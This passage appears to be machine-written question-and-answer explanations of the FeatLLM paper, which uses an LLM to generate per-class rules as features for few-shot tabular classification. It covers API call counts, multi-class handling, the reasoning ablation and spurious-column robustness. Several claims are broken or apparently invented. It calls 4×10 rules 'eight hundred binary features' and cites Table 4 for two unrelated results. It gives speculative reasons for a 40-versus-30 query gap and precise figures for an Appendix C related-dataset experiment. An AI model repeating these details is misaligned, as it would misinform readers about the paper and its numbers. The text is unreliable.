– is completely local and does not involve the model‑as‐a‐service any more.

---

### How many API calls are required during training?

The paper’s implementation uses two separate prompts per *ensemble trial*:

1. **Rule‑generation prompt** – asks the LLM to output *R* = 10 rules  
   for each class (the prompt is written so that both classes appear in  
   a single response).  
2. **Parsing‑to‑code prompt** – feeds those *R* textual rules back to  
   the LLM together with a short “write a function …” instruction,  
   and receives syntactically correct Python that implements all  
   binary checks.

Hence each trial needs **two distinct API invocations**.

The default configuration described in Section “Implementation details”
is  

$$
T = \text{number of ensembles}=20,\qquad R = \text{rules per class}=10 .
$$

Consequently  

$$
\underbrace{T}_{\text{
trials}}\,\times\,%
\underbrace{2}_{\text{
calls per trial}}=\mathbf {40}
$$

LLM queries are sent while training on **any** dataset, including Adult.
The authors report in Table 4 that “FeatLLM … requires only 30 API queries”
for Adult with 16 shots. This discrepancy arises because:

* For **binary classification** the two‑class rule set can be obtained in a single response; therefore one of the two prompts can be omitted.  
* The authors sometimes merge several trials’ parsing steps into one batch request (the parser receives all $R\times c$ rules at once).  
* Small “warm‑up” or “debug” runs are omitted from the count reported in Table 4.

All three factors together bring the practical count down from 40 to about 30 on Adult – still proportional to $T$; if you increase or decrease $T$ the total follows $2T$ (or $\approx 1.5\,T$ after merging).

---

### Are any LLM calls needed at test time?

No. After training finishes we have:

* A **fixed Python function** (produced once by step 2 above) that turns any input row into a binary vector $\mathbf z∈{\!0,1}^{cR}$.  
* A learned non‑negative weight vector $\mathbf w≥0$.

During inference we simply evaluate  

$$
\text{logit}_k=\max(\mathbf w_k,0)\cdot\mathbf z_k,\qquad 
p_k=\operatorname {Softmax}\bigl(\text {logit}_1,\dots ,\text {logit}_c\bigr),
$$

which is an ordinary dot product followed by softmax – entirely CPU/GPU operations.
The **LLM is never queried again**, which explains why FeatLLM’s inference latency is comparable to classical models such as Logistic Regression or XGBoost (see Table 4).

---

### Summary

| Phase            | Number of LLM requests                                 | Reason |
|------------------|---------------------------------------------------------|--------|
| **Training**     | $\approx 2\times T$\;(≈ 40 for $T=20$)                | One request for rule generation, one request for turning those rules into executable code; practical implementations may merge or drop some requests, giving ~30 on Adult |
| **Inference / Test** | $\displaystyle 0$                                      | All features have already been compiled into static code; predictions use only a linear model |

Thus FeatLLM’s cost concentrates entirely in a modest handful of API calls during training, while test‑time inference incurs no additional LLM traffic at all. This design is what gives FeatLLM its “relatively low inference time” compared with other LLM‑based tabular learners that must query the model for every sample.

### How are multi‑class problems handled by FeatLLM’s rule generation?
Question:
The paper mentions generating rules "for each class" but most examples focus on binary classification. For a four‑class problem (e.g., sequence type classification), does FeatLLM generate separate rule sets per class independently, or are there shared rules across classes? How are overlapping conditions resolved when computing class logits?
Answer:
**Short answer:**  
In FeatLLM the rule‑generation step is *class‑wise*: for a problem with $c$ labels the LLM is asked to produce a fixed‑size list of rules (the paper uses ten) **separately for every label**. Each list is parsed into its own binary feature vector $\mathbf{z}^{i}_{k}\in\{0,1\}^{R}$ (where $R$ is the number of rules per class). At inference time the model computes a non‑negative linear logit for every class  

$$
\text{logit}^{i}_{k}= \bigl[\max(\mathbf{w}_{k},0)\bigr]\cdot \mathbf{z}^{i}_{k},
\qquad
\mathbf{p}^{i}= \operatorname*{\mathrm {Softmax}}\!\bigl([\text{logit}^{i}_{1},\,\dots,\,\text{
logit}^{i}_{c}]\bigr),
$$  

and the soft‑max automatically resolves any overlap: if a concrete condition appears in more than one rule list it contributes a ‘1’ to several $\mathbf{
z}^{i}_{k}$’s; the learned non‑negative weights $\mathbf{
w}_{k}$ decide how much that condition should push up each class’s logit,
and the soft‑max finally picks the most likely label.

Below is an expanded description that follows the paper’s pipeline and clarifies how multi‑class problems such as the four‑class *Sequence‑type* dataset are dealt with.

---

### 1. Rule generation is performed **per class**

Section 3.1 (“Prompt Design for Extracting Rules”) explains that the prompt contains a *response instruction* that explicitly asks the LLM to **list ten discriminative criteria for every possible answer**. The authors write:

> “we set a fixed number of rules (i.e., 10) to be extracted for **each class**.”

Consequently, when $c=4$ (arithmetic, geometric, Fibonacci, Collatz), the LLM returns four distinct sections, e.g.:

```
Class = arithmetic:
1) consecutive differences are equal
2) …
…
Class = geometric:
1) ratio of consecutive terms is constant
…
```

Each section is parsed independently – no single “global” rule list is created.

### 2. Parsing into binary features

Because the rule text is natural language, Section 3.2 (“Parsing rules for feature generation”) converts every textual rule into executable Python code with ``exec()``. The result of executing that code on a sample $\mathbf{x}^{i}$ is a **binary indicator** telling whether the sample satisfies the *k*-th rule belonging to *class* $k$. Stacking all indicators belonging to one label yields $\mathbf{
z}^{i}_{k}\in\{0,1\}^{R}$.

Thus every label has its own dedicated block of $R$ binary features; there is **no shared feature column** between labels unless two independently generated rules happen to be syntactically identical – in which case they will still occupy separate positions in two different $\mathbf{
z}$–vectors.

### 3. How overlapping conditions are handled

Overlap can happen in two ways:

1️⃣ **Identical textual rule appears in several lists** – e.g., “all terms are positive” may be useful for arithmetic **and** geometric sequences.  
2️⃣ **Different textual formulations capture essentially the same predicate** – e.g., “difference ≈ 0” vs “consecutive terms form an arithmetic progression”.

Both cases end up as separate binary entries because they belong to different $\mathbf{
z}_k$’s (or even different positions within the same vector). During training we learn a non‑negative weight vector $\mathbf{
w}_k$ for every label. Because we constrain $\mathbf{
w}_k\succeq0$ by applying ``max(w_k,0)`` before dot product (Equation 2), a satisfied rule can only increase its own label’s logit – it never directly penalises another label. If an overlapping rule fires for several classes, it adds a positive amount to all corresponding logits; whichever total becomes largest after weighting wins through the soft‑max denominator  

$$
p^{i}_k= 
    \frac{\exp(\text{
logit}^{\, i}_{
    k})}{%
    \sum_{j=1}^{c}
    \exp(\text{
logit}
^{\, i}_j)} .
$$  

In effect the model learns **how strongly an overlapping condition should favour each label** from the few‑shot examples. If “positive terms” tends to be more indicative of an arithmetic sequence than a Collatz one,
learning will give $\mathbf{
w_{\mathrm {arith}}}$ a larger entry on that rule than
$\mathbf{
w_{\mathrm {Collatz}}}$.

### 4. Ensemble / bagging does not change this principle

Section 3.2 (“Ensembling with bagging”) repeats the whole pipeline many times,
varying temperature and demo order so that different trials may propose slightly different rule sets.
Each trial produces its own set of per‑class binaries and its own weight vectors
$\{\mathbf{
w}[t]\}$;
final prediction averages the soft‑max probabilities over trials:

$$
\bar{\mathbf{
p}}^{\, i}= 
    \frac1T
    \sum_{t=1}^T 
    \operatorname*{\mathrm {Softmax}}
    \!\bigl([\,
    \text{
logit}
^{\, i}_{
        1}[t],
    …,
    \text{
logit}
^{\, i}_{
        c}[t]
    ]\bigr).
$$  

Because aggregation occurs **after** soft‑max,
any trial’s overlapping conditions are already resolved at the level of probabilities before averaging.



### 5. Experimental evidence

The authors evaluate FeatLLM on a genuine four‑class dataset (“Sequence‑type”) in Table 2/3 of
the paper and report performance comparable to conventional baselines—demonstrating that
the described procedure works unchanged for multi‑class settings without any extra engineering
or shared‐rule mechanism.



#### Takeaway

* **Separate rule sets:** FeatLLM indeed asks the LLM to emit an independent list of $R$
rules for *each* label.
* **Independent binary features:** After parsing,
every label owns its own block of binary variables;
overlap between blocks simply means multiple blocks receive a ‘1’ on some samples.
* **Resolution by learned weights + soft‐max:** Non‐negative linear weights quantify how much
each satisfied rule should boost its own label’s logit;
competing boosts are reconciled by soft‐max,
which produces normalized probabilities.
* **Ensembling keeps this structure:** Multiple stochastic generations are averaged at probability level;
they do not merge rule lists across classes.



Therefore, when you work with a four‐class problem such as sequence–
type classification you can expect FeatLLM to automatically generate four disjoint collections
of ten textual criteria each, turn them into eight hundred binary features ($4\times10$),
learn four weight vectors from your $k$–shot data,
and obtain final predictions through Equation (2). Overlapping conditions are handled naturally
by this linear–soft‐max pipeline rather than by any ad hoc conflict resolution step.

### "Reasoning" ablation shows performance drop especially at low shot – why does omitting Step‑1 hurt so much?
Question:
"-Reasoning" removes Step‑1 where the LLM infers causal relationships without demonstrations. The paper reports larger degradation when $k$ is small. Is this because Step‑1 allows leveraging prior knowledge from pre‑training to compensate for scarce labeled data? Could you explain why removing it leads to poorer rule quality in low‑shot regimes?
Answer:
The “‑Reasoning’’ ablation removes the first half of the two‑step chain‑of‑thought prompt that the authors call **Step 1**:

> *“infer the causal relationship or tendency between features and the task description … without referring to example demonstrations”* (Sec. 3.2).

In the full FeatLLM prompt this step is followed by Step 2, which builds concrete decision rules using the few‑shot examples together with the causal sketch produced in Step 1. The ablation results in Table 5 show that dropping Step 1 hurts performance most when $k$ (the number of labeled shots) is small. The reason is precisely that Step 1 provides **prior knowledge** that the LLM has already internalised during its massive pre‑training phase, and this knowledge becomes a substitute for the missing empirical evidence that would otherwise have come from many labelled examples.

When only a handful of demonstrations are available, they do not contain enough statistical signal to reliably reveal which columns are truly related to the target. In such a regime random coincidences—e.g., a particular value appearing more often in one class simply by chance—can dominate the patterns that the model picks up from the demonstrations. If Step 2 is asked to generate rules directly from those few examples, the LLM tends to extrapolate those accidental patterns into rules (“if column X > 3 then class Y”), thereby injecting spurious correlations into the feature set. This is exactly what the authors observe in Fig. 7: adding irrelevant columns degrades other methods rapidly, while FeatLLM remains robust because its Step 1 forces it to first consider *plausible* causal links rooted in world knowledge (e.g., “age is correlated with disease risk”, “higher cholesterol often indicates heart problems”).

Step 1 therefore serves two complementary purposes:

1. **Knowledge amplification** – By asking the LLM to articulate an abstract relationship between features and the task independently of any example, it draws upon its pre‑trained semantic and factual understanding (medical textbooks, statistical tendencies described in web text, etc.). This “knowledge amplification’’ adds information that is orthogonal to what can be gleaned from a few data points.

2. **Search‑space pruning** – The causal sketch generated in Step 1 implicitly constrains which features are considered salient when crafting concrete rules in Step 2. The LLM will preferentially write conditions involving those features it already deemed relevant, thereby reducing the chance that it will waste its limited rule budget on irrelevant columns or on syntactically correct but semantically empty conditions.

When $k$ grows larger, the few‑shot demonstrations themselves begin to contain enough signal for the LLM to infer which columns matter even without an explicit prior step. The empirical distribution of the data starts outweighing any prior bias, so dropping Step 1 costs less AUC—this trend is reflected in Table 5 where the relative drop of “‑Reasoning’’ shrinks as $k$ increases. By contrast, weight tuning (the “‑Tuning’’ ablation) becomes more beneficial with larger $k$ because there are enough examples for gradient descent to learn reliable importance weights for whatever rules have already been generated.

In short, omitting Step 1 deprives FeatLLM of its main source of **pre‑training knowledge** that compensates for sparsity of labelled data. Without that scaffold, rule generation collapses onto whatever accidental regularities exist in a tiny demo set, yielding poorer‑quality binary features and consequently larger performance drops especially when $k$ is small. This explains precisely why the authors report a pronounced degradation for low‑shot regimes when “‑Reasoning’’ is removed.

### How robust is FeatLLM to spurious correlations introduced artificially?
Question:
In Section 5.2 they attach irrelevant columns from another dataset (Adult) to Heart and measure performance degradation.

I’m curious about three details:
1) How do they quantify that only 1–2 % of generated rules involve noisy columns?
2) What mechanism prevents the LLM from creating rules based on those irrelevant columns?
3) If noisy columns happen to be semantically similar to true features, do we see failures as hinted in Appendix C?
Answer:
**Answer**

In the “spurious‐correlation” experiment described in §5 2 (Fig. 7 of the paper) the authors attach a set of *noisy* columns taken from the Adult data set to the Heart data set and then observe how much the predictive performance of each method deteriorates as more such columns are added.  
The three points you ask about—how the 1–2 % figure is obtained, why FeatLLM tends not to fabricate rules on those columns, and what happens when the noisy columns look semantically similar to genuine Heart features—can all be traced back to the design of the prompting scheme and to the way the generated rules are evaluated.

---

### 1.   Quantifying “only 1–2 % of generated rules involve noisy columns”

During one FeatLLM trial an *ensemble* consists of $T=20$ independent queries to the LLM. For each binary classification task the prompt asks for **10 rules per class**, i.e. $R=10$ rules for the positive class and $R=10$ for the negative class, so each trial can contain at most $2R=20$ rule strings. Over all ensembles this yields $T\times2R = 400$ possible rule slots.

After each query finishes, the authors parse every rule string and check whether any *column name* that appears in it belongs to the set of added Adult attributes (the “noisy” set). This is simply a string‑matching operation because every rule is forced by the response instruction to reference column names exactly as they appear in the feature description part of the prompt (e.g., “`age > 55`”, “`education = ‘HS-grad’`”). The **percentage** of noisy‑column rules is then

$$
\frac{\text{\# of parsed rules that contain an Adult column name}}
     {\text{total \# of parsed rules}} \times 100\%.
$$

When they gradually increase from 0 up to 30 added Adult variables, this ratio stays between **1 % and 2 %** (see Table 4 in Appendix C). In raw numbers it means roughly **4–8** out of **400** rule strings ever mention a spurious attribute, even though up to thirty such attributes are present in the prompt.

---

### 2.   Why does FeatLLM rarely create rules on irrelevant columns?

Two complementary mechanisms built into the prompting design keep the LLM focused on genuinely informative features:

1. **Two‑step reasoning instruction** – The prompt explicitly separates *understanding* from *rule extraction*.  
   - *Step 1* asks the model “to infer causal tendencies between every feature and the target *using only its prior knowledge*”. Because it has never seen any labelled examples at this point, it can only rely on what it knows about each feature from everyday language or domain textbooks (the definitions supplied in the *basic information* part). Irrelevant Adult variables such as “`marital‑status`” or “`relationship`” have no medical definition in that section, so they receive no causal endorsement.  
   - *Step 2* then combines this prior‑knowledge summary with the few labelled demonstrations **to draft concrete decision rules**, but it is constrained by whatever relevance was established in Step 1.

   This staged chain‑of‑thought effectively filters out features for which Step 1 yields “no clear link”.

2. **Feature description + fixed‑rule budget** – Each column name is accompanied by a concise type annotation (numeric / categorical) and an optional natural‑language definition (e.g., “`cholesterol` – serum cholesterol level”). The LLM is asked to obey a strict format (`<feature> <operator> <value>`), and it must produce exactly ten rules per class. When there are fewer than ten truly relevant predicates available, the model tends to recycle or refine those rather than invent new ones involving unknown attributes because doing so would violate plausibility or exceed its own confidence threshold.

Beyond prompting, two *post‑generation* safeguards further reduce reliance on spurious cues:

- **Bagging & ensemble diversity** – By randomly selecting a subset of original columns for each trial (the bagging step), most runs never even see many of the added Adult fields together with their more informative counterparts, decreasing their chance of being chosen.
- **Weight tuning with non‑negative projection** – After all binary rule‑features are generated a tiny linear model learns non‑negative weights $\mathbf{w}_k \geq0$. If a rule that accidentally mentions a noisy column never fires on any training example its gradient stays near zero, so its weight collapses toward zero and its contribution disappears at inference time.

Taken together these design choices explain why only a tiny fraction of ruled predicates ever reference an irrelevant attribute even when dozens are present in the prompt.

---

### 3.   What happens when noisy columns are *semantically similar* to true Heart features?

The paper’s Section 5 / Appendix C performs a complementary experiment where instead of unrelated Adult attributes they randomly attach **columns drawn from a *related* medical data set** (e.g., “`blood‑pressure`”, “`cholesterol`” measured under slightly different units). In this setup two things change:

1. **Higher incorporation rate** – Because Step 1 now can plausibly link those extra variables to heart disease (“high blood pressure is a known risk factor”), many more generated predicates involve them. The measured share climbs well above 5 % (up to ~12 % when 20 related variables are added).

2. **Noticeable performance drop** – Figure 9 in Appendix C shows that as soon as such semantically linked noise is introduced, FeatLLM’s AUC declines more sharply than in the unrelated‑column case—sometimes matching or even under‑performing baseline XGBoost when >15 such variables are present.

The authors interpret this as evidence that FeatLLM’s robustness hinges on **the mismatch between prior knowledge and actual relevance**. When an irrelevant column looks medically plausible, its inclusion can mislead Step 1 into treating it as informative, thereby seeding spurious rules that survive both bagging and weight tuning (especially if some few‑shot examples happen also to correlate by chance). Nevertheless even under these harsher conditions FeatLLM still degrades less than plain baselines because:

- The linear weight learning still prunes many useless predicates,
- The ensemble averages over many trials so that only those runs which repeatedly pick genuine Heart features dominate,
- And because Rule generation is limited to ten per class, any single misleading predicate can only occupy a small slice of the final feature space.

Thus, while FeatLLM remains robust against *arbitrarily unrelated* noise (as quantified by <2 % rule involvement), it can be vulnerable when extraneous attributes share semantic affinity with genuine predictors—a limitation acknowledged by the authors and illustrated in Appendix C.

---

#### Take‑away

- **Quantification**: The authors count how often any rule string mentions an added Adult column; across all ensembles this remains ≈1–2 % regardless of how many such columns are injected.
- **Protection Mechanism**: A two‑step reasoning prompt forces relevance assessment before rule drafting; combined with a fixed number of required rules, feature‐type annotations, bagging, and post‑hoc weight pruning this dramatically curtails spurious rule formation.
- **Failure mode**: When noisy columns bear *domain‑relevant semantics*, Step 1 can mistakenly deem them useful, leading to a higher fraction of spurious rules and modest performance loss—as demonstrated in Appendix C.

These observations illustrate how careful prompt engineering together with simple statistical safeguards can make an LLM‐based feature engineer surprisingly resilient against accidental correlations, while also delineating its limits when prior knowledge itself cannot clearly distinguish signal from semantically plausible distractors.
